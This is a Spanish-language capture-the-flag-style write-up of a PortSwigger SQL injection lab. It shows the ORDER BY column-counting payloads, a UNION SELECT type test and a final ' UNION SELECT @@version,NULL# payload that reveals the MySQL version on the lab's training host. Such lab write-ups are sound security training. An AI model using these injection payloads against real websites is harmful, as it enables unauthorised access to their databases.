# Write-up - PortSwigger SQLi Lab 7

Voy a hacer un laboratorio de Port Swigger. El lab 7 de SQLi (En esta url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

## Descripción:

Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Traducción:

Laboratorio: ataque de inyección SQL, consultando el tipo y la versión de la base de datos en MySQL y Microsoft.

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Puedes usar un ataque UNION para recuperar los resultados de una consulta inyectada.

To solve the lab, display the database version string.

Para resolver el laboratorio, muestra la cadena de versión de la base de datos.

---

Objetivo Principal:

Obtener tipo y versión de la BBDD MySQL y Microsoft.

---

Le damos a abrir lab y nos abre la página:

https://0a2700ca03e1645a837729b0007700fa.web-security-academy.net/

La web es como imagen 1:

![Imagen 1](imagenes/imagen1.png)

Referencia imagen 1: Vista inicial.

---

Abrimos BurpSuite + FoxyProxy.

Vamos a:

/filter?category=Food+%26+Drink

Request enviada a Repeater:

GET /filter?category=Food+%26+Drink HTTP/1.1
Host: 0a2700ca03e1645a837729b0007700fa.web-security-academy.net

---

ORDER BY:

' ORDER BY 1# → 200  
' ORDER BY 2# → 200  
' ORDER BY 3# → 500  

→ 2 columnas

---

Tipos:

' UNION SELECT 'a','a'# → 200  

→ ambas aceptan texto

---

Payload final:

' UNION SELECT @@version,NULL#

Explicación:

@@version → variable global (MySQL / SQL Server)  
,NULL → relleno  
# → comentario  

---

Resultado (imagen 2):

![Imagen 2](imagenes/imagen2.png)

Referencia imagen 2: versión mostrada.

8.0.42-0ubuntu0.20.04.1

---

Lab resuelto

